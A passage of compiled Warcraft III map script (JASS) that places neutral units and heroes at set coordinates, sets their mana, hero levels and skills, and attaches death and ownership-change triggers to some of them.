set Hu=CreateUnit(Ht,$68303446,4874.2,-12163.5,129.082)
set Hu=CreateUnit(Ht,$68303446,5344.7,-12146.5,129.082)
set Hu=CreateUnit(Ht,$68303446,6418.4,-12163.5,129.082)
set Hu=CreateUnit(Ht,$68303446,6013.6,-11715.1,129.082)
set Hu=CreateUnit(Ht,$68303446,5301.5,-11640.7,129.082)
set Hu=CreateUnit(Ht,$68303446,5283.6,-11394.8,129.082)
set Hu=CreateUnit(Ht,$68303446,5640.2,-11285.9,129.082)
set IR=CreateUnit(Ht,$68303447,4978.4,-8930.,78.1)
set IS=CreateUnit(Ht,$68303447,5524.1,-8975.8,78.1)
set IT=CreateUnit(Ht,$68303447,3889.6,-11586.2,78.1)
set IU=CreateUnit(Ht,$68303447,6365.6,-9045.7,78.1)
set IV=CreateUnit(Ht,$68303447,3981.2,-10003.1,78.1)
set Hu=CreateUnit(Ht,$68303446,6014.2,-12016.1,129.082)
set Hu=CreateUnit(Ht,$68303446,7035.1,-11985.2,129.082)
set Hu=CreateUnit(Ht,$68303446,7041.7,-11281.1,129.082)
set Hu=CreateUnit(Ht,$68303446,6881.2,-12174.8,129.082)
set Hu=CreateUnit(Ht,$6E627A6B,3489.,-6581.3,233.31)
set Hu=CreateUnit(Ht,$68303446,7012.5,-11084.3,129.082)
set Hu=CreateUnit(Ht,$68303446,6296.,-10989.5,129.082)
set Hu=CreateUnit(Ht,$68303446,6168.1,-10809.7,129.082)
set Hu=CreateUnit(Ht,$68303446,5580.,-10711.4,129.082)
set Hu=CreateUnit(Ht,$68303446,5488.7,-10120.9,129.082)
set Hu=CreateUnit(Ht,$68303446,5492.1,-9593.7,129.082)
set Hu=CreateUnit(Ht,$68303446,5673.8,-9080.,129.082)
set Hu=CreateUnit(Ht,$68303446,5868.2,-9517.7,129.082)
set Hu=CreateUnit(Ht,$68303446,5841.7,-10070.2,129.082)
set Hu=CreateUnit(Ht,$68303446,6012.,-10379.7,129.082)
set Hu=CreateUnit(Ht,$68303446,6475.3,-10396.1,129.082)
set Hu=CreateUnit(Ht,$68303446,6707.1,-10376.1,129.082)
set Hu=CreateUnit(Ht,$68303446,7044.3,-10303.4,129.082)
set Hu=CreateUnit(Ht,$68303446,6775.6,-9999.8,129.082)
set Hu=CreateUnit(Ht,$68303446,6392.9,-9761.9,129.082)
set Hu=CreateUnit(Ht,$68303446,6386.2,-9307.6,129.082)
set Hu=CreateUnit(Ht,$6E627A6B,3096.5,-6336.,233.31)
set Hu=CreateUnit(Ht,$6E627A6B,2685.5,-7956.4,233.31)
set Hu=CreateUnit(Ht,$6E627A6B,3231.5,-7281.8,233.31)
set Hu=CreateUnit(Ht,$6E30324C,13834.5,-6000.7,54.953)
set Hu=CreateUnit(Ht,$6E303249,13827.6,-874.3,175.52)
set Hu=CreateUnit(Ht,$6E303249,14501.2,-1447.7,175.52)
set Hu=CreateUnit(Ht,$6E303249,14630.7,-1411.6,175.52)
set Hu=CreateUnit(Ht,$6E303249,16041.,-1213.1,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,15362.1,-2665.1,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,15000.,-3521.8,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,14772.6,-3857.5,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344D,15508.9,-5605.1,320.811)
set Hu=CreateUnit(Ht,$6E303756,23553.9,4896.9,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-7428.,-1120.5,69.993)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,23797.6,5029.3,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23682.3,4659.6,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,23711.,4878.1,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,23210.2,4768.3,51.798)
set Hu=CreateUnit(Ht,$6E303756,22048.6,4985.3,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,22292.3,5117.6,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,22177.,4747.9,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,22205.8,4966.5,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,21705.,4856.7,51.798)
set Hu=CreateUnit(Ht,$6E303756,20569.,5047.,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,20812.7,5179.3,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,20697.4,4809.6,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,20726.2,5028.1,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,20225.3,4918.4,51.798)
set Hu=CreateUnit(Ht,$6E303756,19705.8,3804.3,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,19362.2,3675.7,51.798)
set Hu=CreateUnit(Ht,$6E303756,18364.6,3791.4,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,18366.5,4058.5,265.573)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,18039.9,4011.6,317.811)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,18521.7,3772.6,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,18020.9,3662.8,51.798)
set Hu=CreateUnit(Ht,$6E303756,17979.9,4690.1,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,18223.6,4822.4,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,18108.3,4452.7,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,18137.,4671.3,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,17636.2,4561.5,51.798)
set Hu=CreateUnit(Ht,$6E303756,18358.4,5540.1,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,18602.1,5672.4,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,18486.8,5302.7,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,18515.6,5521.2,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,18014.8,5411.4,51.798)
set Hu=CreateUnit(Ht,$6E303756,18561.3,7210.8,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,18805.,7343.1,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,18689.7,6973.4,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,18718.4,7191.9,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,18217.6,7082.2,51.798)
set Hu=CreateUnit(Ht,$6E303756,19421.6,6259.5,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,19665.3,6391.8,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,19550.,6022.1,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,19578.8,6240.6,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,19078.,6130.8,51.798)
set Hu=CreateUnit(Ht,$6E303756,19862.4,7004.,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,20106.1,7136.4,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,19990.8,6766.7,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,20019.5,6985.2,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,19518.7,6875.4,51.798)
set Hu=CreateUnit(Ht,$6E303756,21011.5,7186.5,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,21255.2,7318.9,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,21139.9,6949.2,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,21168.6,7167.7,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,20667.8,7057.9,51.798)
set Hu=CreateUnit(Ht,$6E303756,22795.8,8415.1,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-8074.8,-155.2,85.75)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6F737031,-8294.3,-97.9,172.91)
set Hu=CreateUnit(Ht,$65666F6E,-7312.,621.,147.4)
set Hu=CreateUnit(Ht,$6E303759,23039.4,8547.4,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,22924.1,8177.7,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,22952.9,8396.2,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,22452.1,8286.4,51.798)
set Hu=CreateUnit(Ht,$6E303756,23603.9,7814.9,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,23847.6,7947.3,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23732.3,7577.6,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,23761.1,7796.1,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-15526.2,-5781.3,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,23260.3,7686.3,51.798)
set Hu=CreateUnit(Ht,$6E303756,22833.9,6713.,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,23077.6,6845.3,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,22962.3,6475.6,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-9182.,-5047.5,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-8825.8,-5072.2,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-8840.7,-5453.2,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-9251.9,-5468.6,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,22991.1,6694.1,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,22490.3,6584.4,51.798)
set Hu=CreateUnit(Ht,$6E303756,21656.1,6052.4,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,21899.7,6184.7,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,21784.5,5815.,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,21813.2,6033.5,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,21312.4,5923.8,51.798)
set Hu=CreateUnit(Ht,$6E303756,19220.9,4642.8,183.3)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,19464.6,4775.1,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,19349.3,4405.4,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303757,19378.,4624.,183.97)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,18877.2,4514.2,51.798)
set Hu=CreateUnit(Ht,$6E303755,18217.6,7082.2,51.798)
set Hu=CreateUnit(Ht,$6E303755,17791.2,6965.,303.038)
set Hu=CreateUnit(Ht,$6E303756,18010.5,7540.2,292.514)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,20064.5,5565.5,278.082)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,18689.7,6973.4,79.907)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,21491.5,7894.8,0.)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,21851.9,7591.8,165.27)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23567.,8598.5,249.666)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303755,22490.3,6584.4,51.798)
set Hu=CreateUnit(Ht,$6E303755,22811.4,7324.6,314.081)
set Hu=CreateUnit(Ht,$6E303758,22532.4,5827.2,137.779)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303758,23728.4,5759.6,244.893)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303759,22700.7,4570.2,65.272)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hc=null
set Hu=null
endfunction
function mo takes nothing returns nothing
local player Ht=Player(PLAYER_NEUTRAL_PASSIVE)
local unit Hu
set Hu=CreateUnit(Ht,$6E667232,-7168.,-4800.,270.)
set Hv=CreateUnit(Ht,$6E303447,-4928.,-23648.,270.)
set Hu=CreateUnit(Ht,$6E6D6831,-12768.,-10272.,270.)
set Hu=CreateUnit(Ht,$6E686E73,-12288.,-10496.,270.)
set Hu=CreateUnit(Ht,$6E686E73,-9600.,-13248.,270.)
set Hu=CreateUnit(Ht,$6E637432,-5408.,-10976.,270.)
set Hw=CreateUnit(Ht,$6E667633,-15968.,1760.,270.)
set Hx=CreateUnit(Ht,$6E303436,-13184.,-12352.,270.)
set Hu=CreateUnit(Ht,$65736879,6048.,2912.,270.)
set Hu=CreateUnit(Ht,$6E676E69,-10272.,7904.,270.)
set Hy=CreateUnit(Ht,$6E303134,-15808.,-8032.,270.)
set Hu=CreateUnit(Ht,$6E646830,9792.,-2304.,270.)
set Hu=CreateUnit(Ht,$6E646831,8640.,-5568.,270.)
set Hu=CreateUnit(Ht,$6E646831,5568.,-6144.,270.)
set Hu=CreateUnit(Ht,$6E646368,4864.,-4672.,270.)
set Hu=CreateUnit(Ht,$6E646368,7424.,-4864.,270.)
set Hz=CreateUnit(Ht,$6E303136,-4160.,-8800.,270.)
set H0=CreateUnit(Ht,$6E657432,6592.,0.,270.)
set Hu=CreateUnit(Ht,$6E30384A,6144.,-576.,270.)
set H1=CreateUnit(Ht,$6E303138,128.,-9120.,270.)
set H2=CreateUnit(Ht,$6E303142,-9216.,8224.,270.)
set H3=CreateUnit(Ht,$6E303355,-10432.,-23648.,270.)
set H4=CreateUnit(Ht,$6E303237,-7616.,15392.,270.)
set H5=CreateUnit(Ht,$6E30374B,-2880.,-23648.,270.)
set Hu=CreateUnit(Ht,$6861726D,-13632.,-10048.,270.)
set Hu=CreateUnit(Ht,$686C756D,-14176.,-10016.,270.)
set H6=CreateUnit(Ht,$6E303149,8512.,-23840.,270.)
set H7=CreateUnit(Ht,$6E30314A,9088.,-23776.,270.)
set H8=CreateUnit(Ht,$6E303341,-12160.,-23712.,270.)
set H9=CreateUnit(Ht,$6E303238,11264.,-22880.,270.)
set IB=CreateUnit(Ht,$6E303239,11776.,-22944.,270.)
set IC=CreateUnit(Ht,$6E303357,-8576.,-23776.,270.)
set ID=CreateUnit(Ht,$6E303253,-13184.,-12320.,270.)
set IE=CreateUnit(Ht,$6E303438,-13184.,-12352.,270.)
set IF=CreateUnit(Ht,$6E303437,-13184.,-12352.,270.)
set Hu=CreateUnit(Ht,$6E746830,24000.,15424.,270.)
set Hu=CreateUnit(Ht,$6E746831,19936.,15392.,270.)
set Hu=CreateUnit(Ht,$6E746830,21504.,11200.,270.)
set Hu=CreateUnit(Ht,$6E746830,22528.,12672.,270.)
set Hu=CreateUnit(Ht,$6E746830,22272.,12736.,270.)
set IG=CreateUnit(Ht,$6E303431,-6656.,-23648.,270.)
set IH=CreateUnit(Ht,$6E303658,8768.,-23456.,270.)
set II=CreateUnit(Ht,$6E303659,11520.,-23072.,270.)
set IJ=CreateUnit(Ht,$6E30374C,-832.,-23584.,270.)
set Hu=null
endfunction
function mp takes nothing returns nothing
local player Ht=Player(PLAYER_NEUTRAL_PASSIVE)
local unit Hu
local trigger Hc
local real I2
set IW=CreateUnit(Ht,$65686970,-12570.2,-12518.6,154.54)
set IX=CreateUnit(Ht,$65646F63,-5535.6,-11164.7,305.65)
set IY=CreateUnit(Ht,$6E766C6B,-14196.8,-2973.5,317.4)
set Hu=CreateUnit(Ht,$6E646572,-10158.,-3539.,266.11)
set Hu=CreateUnit(Ht,$6E646572,-5149.1,-2334.5,12.09)
set Hu=CreateUnit(Ht,$6E656372,-7717.2,-4764.,222.94)
set Hu=CreateUnit(Ht,$6E656372,-10924.3,-5595.7,240.68)
set Hu=CreateUnit(Ht,$6E726163,-15770.4,-5716.1,291.86)
set IZ=CreateUnit(Ht,$6E30334D,-14287.3,14624.3,357.72)
call SetUnitState(IZ,UNIT_STATE_MANA,0)
set Ia=CreateUnit(Ht,$6E6D726D,-12602.2,-10181.,106.76)
set Ib=CreateUnit(Ht,$65303134,10089.7,5400.,323.632)
set Ic=CreateUnit(Ht,$68777433,-3827.1,-3621.2,312.331)
set Id=CreateUnit(Ht,$686D696C,-12535.8,-9142.6,268.6)
set Ie=CreateUnit(Ht,$6E766B32,-14093.5,-2907.1,232.18)
set If=CreateUnit(Ht,$6E6A6B73,-13836.4,-10023.1,311.74)
set Hu=CreateUnit(Ht,$6E736E6F,-2123.4,-9816.4,9.668)
set Hu=CreateUnit(Ht,$6E736E6F,-1239.6,-7784.1,132.455)
set Hu=CreateUnit(Ht,$6E736E6F,-2657.3,-7740.3,177.116)
set Hu=CreateUnit(Ht,$6E736E6F,-3496.2,-3852.3,29.4)
set Ig=CreateUnit(Ht,$6E647470,-9911.9,-7442.9,266.82)
set Ih=CreateUnit(Ht,$4E706C68,3565.9,-4487.3,266.67)
call SetUnitState(Ih,UNIT_STATE_MANA,0)
set Ii=CreateUnit(Ht,$6E636867,-13142.1,-9528.4,335.95)
set Ij=CreateUnit(Ht,$68737074,4109.9,-4947.1,200.)
call SetUnitState(Ij,UNIT_STATE_MANA,0)
set Ik=CreateUnit(Ht,$6E303056,1253.3,4131.6,51.29)
set Il=CreateUnit(Ht,$65303037,-4119.5,301.3,316.83)
set Im=CreateUnit(Ht,$6E66746B,-6494.,3014.7,49.41)
set In=CreateUnit(Ht,$75736864,-4778.3,7643.4,139.77)
set Io=CreateUnit(Ht,$68776174,9966.7,4154.5,237.03)
set Ip=CreateUnit(Ht,$6E303753,13700.3,4771.6,177.195)
set Iq=CreateUnit(Ht,$68303133,-7165.2,-2221.7,.85)
set Ir=CreateUnit(Ht,$68303133,-7895.1,-2152.6,120.)
set Hu=CreateUnit(Ht,$6E646F67,7893.4,-2004.,254.05)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mF)
set Hu=CreateUnit(Ht,$6F73706D,14958.1,7127.5,291.3)
set Is=CreateUnit(Ht,$65737076,-12628.3,9261.8,46.27)
set Hu=CreateUnit(Ht,$6E6D7065,14747.3,6801.4,14.39)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mN)
set It=CreateUnit(Ht,$45776172,17474.5,15260.1,323.766)
call SetUnitState(It,UNIT_STATE_MANA,45)
set Iu=CreateUnit(Ht,$68303554,-13071.5,14338.7,174.81)
set Hu=CreateUnit(Ht,$6E303841,23361.2,13163.1,180.)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mI)
set Hu=CreateUnit(Ht,$68677972,4478.1,-2632.8,279.24)
set Iv=CreateUnit(Ht,$6E303557,-11296.2,-80.8,267.411)
set Iw=CreateUnit(Ht,$6F776172,1169.2,15624.,322.41)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Iw,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Iw,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mK)
set Ix=CreateUnit(Ht,$6E6D7972,-1717.5,11731.3,165.57)
set Hu=CreateUnit(Ht,$6E303857,23943.4,-1149.9,183.038)
set Hu=CreateUnit(Ht,$6E706E77,13918.6,1562.5,180.38)
set Iy=CreateUnit(Ht,$68646877,-6136.1,1355.8,256.3)
call SetUnitState(Iy,UNIT_STATE_MANA,0)
set Iz=CreateUnit(Ht,$65647279,-16000.4,-6947.4,345.5)
set I0=CreateUnit(Ht,$65303042,-15998.7,-6757.7,135.4)
set I1=CreateUnit(Ht,$756B7467,-10126.7,7750.9,51.13)
set I2=GetUnitState(I1,UNIT_STATE_LIFE)
call SetUnitState(I1,UNIT_STATE_LIFE,.01*I2)
set I3=CreateUnit(Ht,$6E666F76,-804.7,1956.,337.21)
set I4=CreateUnit(Ht,$6E303534,-13509.,-11612.8,241.31)
set Hu=CreateUnit(Ht,$6E68656D,-13995.8,-9977.4,228.58)
set I5=CreateUnit(Ht,$75303058,6833.9,4576.9,267.97)
set I6=CreateUnit(Ht,$65646F74,-15877.3,-2995.2,293.106)
call SetUnitState(I6,UNIT_STATE_MANA,0)
set I7=CreateUnit(Ht,$6F677275,-9514.4,15582.2,276.751)
set I8=CreateUnit(Ht,$68303133,-11046.1,-6932.1,203.105)
set I9=CreateUnit(Ht,$68303133,-9152.3,-6573.7,.85)
set JB=CreateUnit(Ht,$68303133,-5270.8,-10643.8,343.638)
set JC=CreateUnit(Ht,$68303133,-11660.8,-14893.2,64.29)
set JD=CreateUnit(Ht,$65303044,-14315.3,14305.6,357.7)
set JE=CreateUnit(Ht,$68303133,-2898.5,-8867.8,54.322)
set JF=CreateUnit(Ht,$68303133,1504.9,-8976.9,128.794)
set JG=CreateUnit(Ht,$68303133,771.2,-4697.8,264.65)
set JH=CreateUnit(Ht,$68303133,-1318.6,1591.,179.091)
set JI=CreateUnit(Ht,$68303133,-1007.4,2642.9,156.8)
set JJ=CreateUnit(Ht,$68303133,-2320.,5800.9,45.91)
set JK=CreateUnit(Ht,$68303133,3409.4,7490.8,79.12)
set JL=CreateUnit(Ht,$68303133,-47.6,7598.7,47.54)
set JM=CreateUnit(Ht,$68303133,-6235.2,6280.3,74.85)
set JN=CreateUnit(Ht,$68303133,-6497.4,2876.6,103.96)
set JO=CreateUnit(Ht,$68303133,-4996.3,9709.,281.82)
set JP=CreateUnit(Ht,$68303133,-9249.3,13064.1,231.93)
set JQ=CreateUnit(Ht,$68303133,1030.4,8612.8,120.7)
set JR=CreateUnit(Ht,$68303133,6568.9,301.5,87.3)
set JS=CreateUnit(Ht,$4F666172,21542.4,8664.,321.13)
call SetHeroLevel(JS,52,false)
call SetUnitState(JS,UNIT_STATE_MANA,57)
call SelectHeroSkill(JS,$414F636C)
call SelectHeroSkill(JS,$414F636C)
call SelectHeroSkill(JS,$414F636C)
call SelectHeroSkill(JS,$414F6673)
call SelectHeroSkill(JS,$414F6673)
call SelectHeroSkill(JS,$414F6673)
call SelectHeroSkill(JS,$414F7366)
call SelectHeroSkill(JS,$414F7366)
call SelectHeroSkill(JS,$414F7366)
call SelectHeroSkill(JS,$414F6571)
set JT=CreateUnit(Ht,$4F746368,24094.9,5563.3,185.37)
call SetHeroLevel(JT,52,false)
call SetUnitState(JT,UNIT_STATE_MANA,42)
call SelectHeroSkill(JT,$414F7368)
call SelectHeroSkill(JT,$414F7368)
call SelectHeroSkill(JT,$414F7368)
call SelectHeroSkill(JT,$414F7773)
call SelectHeroSkill(JT,$414F7773)
call SelectHeroSkill(JT,$414F7773)
call SelectHeroSkill(JT,$414F6165)
call SelectHeroSkill(JT,$414F6165)
call SelectHeroSkill(JT,$414F6165)
call SelectHeroSkill(JT,$414F7265)
set JU=CreateUnit(Ht,$65303051,10942.1,-8564.9,34.883)
set JV=CreateUnit(Ht,$6E303536,-11236.6,-16135.7,180.42)
set Hu=CreateUnit(Ht,$6E30355A,7189.3,-1674.6,202.06)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mR)
set JW=CreateUnit(Ht,$6E303636,15767.9,-4427.8,126.35)
set JX=CreateUnit(Ht,$65303054,3337.5,11958.9,180.)
set JY=CreateUnit(Ht,$68303439,24466.3,-24475.2,51.121)
set JZ=CreateUnit(Ht,$6E30334F,-14305.2,14966.4,358.28)
set Ja=CreateUnit(Ht,$656D7467,14834.2,-5282.,248.87)
set Jb=CreateUnit(Ht,$6830354C,-1525.9,-14146.,185.2)
set Jc=CreateUnit(Ht,$6E303350,-14274.5,15311.1,331.69)
set Jd=CreateUnit(Ht,$6E303351,-13947.8,15473.2,274.11)
set Je=CreateUnit(Ht,$68303343,-8997.3,-6439.2,328.69)
set Jf=CreateUnit(Ht,$6E766B32,-13031.7,674.7,145.348)
set Jg=CreateUnit(Ht,$75303048,-13638.7,15478.9,269.96)
set Jh=CreateUnit(Ht,$68303056,-13352.9,15471.2,268.2)
set Ji=CreateUnit(Ht,$456D6F6F,-3027.6,13862.5,357.67)
call SetUnitState(Ji,UNIT_STATE_MANA,45)
set Hu=CreateUnit(Ht,$65687072,-3070.7,14020.5,293.6)
set Jj=CreateUnit(Ht,$4F736864,17520.9,5543.8,0.)
call SetHeroLevel(Jj,52,false)
call SetUnitState(Jj,UNIT_STATE_MANA,51)
call SelectHeroSkill(Jj,$414F6877)
call SelectHeroSkill(Jj,$414F6877)
call SelectHeroSkill(Jj,$414F6877)
call SelectHeroSkill(Jj,$414F7664)
set Jk=CreateUnit(Ht,$68303059,-13049.,14573.6,180.)
call SetUnitState(Jk,UNIT_STATE_MANA,0)
set Jl=CreateUnit(Ht,$68303345,7993.3,13405.2,78.4)
set Jm=CreateUnit(Ht,$68303345,10213.8,13479.6,78.4)
set Jn=CreateUnit(Ht,$68303345,13431.6,13343.,78.4)
set Jo=CreateUnit(Ht,$6E746B77,21548.3,10977.6,222.97)
set Jp=CreateUnit(Ht,$6830305A,-13035.5,15214.4,180.)
call SetUnitState(Jp,UNIT_STATE_MANA,0)
set Jq=CreateUnit(Ht,$65303053,16086.,-23674.9,101.78)
set Jr=CreateUnit(Ht,$68303130,-13045.4,14863.5,180.)
call SetUnitState(Jr,UNIT_STATE_MANA,0)
set Js=CreateUnit(Ht,$68303048,-15684.7,-154.8,203.8)
set Jt=CreateUnit(Ht,$6F303048,9772.7,-2599.3,325.96)
set Ju=CreateUnit(Ht,$6830344E,3903.9,-7811.7,138.13)
set Jv=CreateUnit(Ht,$68303455,5180.9,7252.,114.55)
call SetUnitColor(Jv,ConvertPlayerColor(9))
set Jw=CreateUnit(Ht,$68303455,3146.8,8262.3,114.55)
call SetUnitColor(Jw,ConvertPlayerColor(9))
set Jx=CreateUnit(Ht,$68303455,3644.7,5322.4,114.55)
call SetUnitColor(Jx,ConvertPlayerColor(9))
set Jy=CreateUnit(Ht,$68303455,-214.2,8391.6,114.55)
call SetUnitColor(Jy,ConvertPlayerColor(9))
